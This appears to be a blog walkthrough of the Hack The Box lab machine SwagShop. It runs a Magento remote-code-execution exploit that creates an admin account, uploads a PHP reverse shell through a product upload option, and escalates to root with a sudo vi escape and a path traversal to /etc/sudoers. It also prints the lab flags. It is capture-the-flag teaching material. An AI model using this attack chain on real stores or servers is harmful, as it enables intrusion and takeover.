---
layout: post
author: msameer234
---
<br />
+=================================================================+<br />
								SCANNING<br />
+=================================================================+<br />
 nmap 10.10.10.140<br />
	PORT   STATE SERVICE<br />
	22/tcp open  ssh<br />
	80/tcp open  http

+=================================================================+<br />
							  ENUMERATION<br />
+=================================================================+

 Wibsite hosted on port 80/http --- SwagShop -- Shoping Site<br />
	Using Magento CMS --- found it by wappalyzer.<br />
	<br />
	Found RCE of Magento: <br />
		command used: searchsploit Magento<br />
			Magento eCommerce - Remote Code Execution  <br />
			/usr/share/exploitdb/exploits/xml/webapps/37977.py<br />
	Copy the exploit and edit it, then set your target: <br />
		e.g. target = "http://10.10.10.140/index.php/"<br />
	and save it.<br />
	<br />
	Now execute it as:<br />
		python exploit.py<br />
		it creates an admin account with username "forme" and password "forme":<br />
		Now login at : http://10.10.10.140/index.php/admin -->> Found this by Dirbuster<br />
		I tried to upload php shell, but I couldn't.<br />
		Then I found a way to create a new product-- added an option that asks user to upload a file with extension .php<br />
	<br />
	Now make an order of the created product and upload the file php-reverse-shell.<br />
	And start multi-handler of uploaded shell on msfconsole<br />
<br />
	Here you can access your uploaded shell on server: <br />
		http://10.10.10.140/media/custom_options/order/p/h/<br />
		found media folder by dirbuster.. then did some search after uploading the shell..<br />
		Set up listener and get the reverse_shell.<br />
<br />
	Now navigate to /home/haris/<br />
<br />
	there is user.txt fie which contains user flag: a448877277e82f05e5ddf9f90aefbac8<br />
<br />
+=================================================================+<br />
						   PRIVILEGE-ESCALATION<br />
+=================================================================+<br />
<br />
Type Command:<br />
	sudo -l and hit enter<br />
Output:<br />
	Matching Defaults entries for www-data on swagshop:<br />
    		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br />
<br />
	User www-data may run the following commands on swagshop:<br />
    		(root) NOPASSWD: /usr/bin/vi /var/www/html/*<br />
<br />
	<br />
Here we found we can access all files from "/var/www/html/" directory and vi text editor from "/usr/bin/" directory with root privileges.<br />
<br />
lets create a tty first as it is not there:<br />
python3 is installed:<br />
the command is: <br />
	python3 -c 'import pty;pty.spawn("/bin/sh")'<br />
<br />
Now, lets edit any file from /var/www/html/ directory with vi using sudo:<br />
<br />
cd /home/haris<br />
<br />
sudo vi /var/www/html/../../../etc/sudoers<br />
<br />
Now to enter into Command Mode and execute the command /bin/sh type in    :!/bin/sh     and hit enter<br />
<br />
and we got root..<br />
<br />
Navigating to /root/ directory..<br />
cd /root<br />
cat root.txt<br />
c2b087d66e14a652a3b86a130ac56721<br />
<br />
   ___<br /> ___
 /| |/|\| |\<br />
/_| ´ |.` |_\           We are open! (Almost)<br />
  |   |.  |<br />
  |   |.  |         Join the beta HTB Swag Store!<br />
  |___|.__|       https://hackthebox.store/password<br />
<br />
                   PS: Use root flag as password!<br />
<br />
<br />
<br />
<br />
And we got flag in root.txt file: c2b087d66e14a652a3b86a130ac56721<br />
<br />
Finish..!!!<br />
<br />
<br /><br /><br />
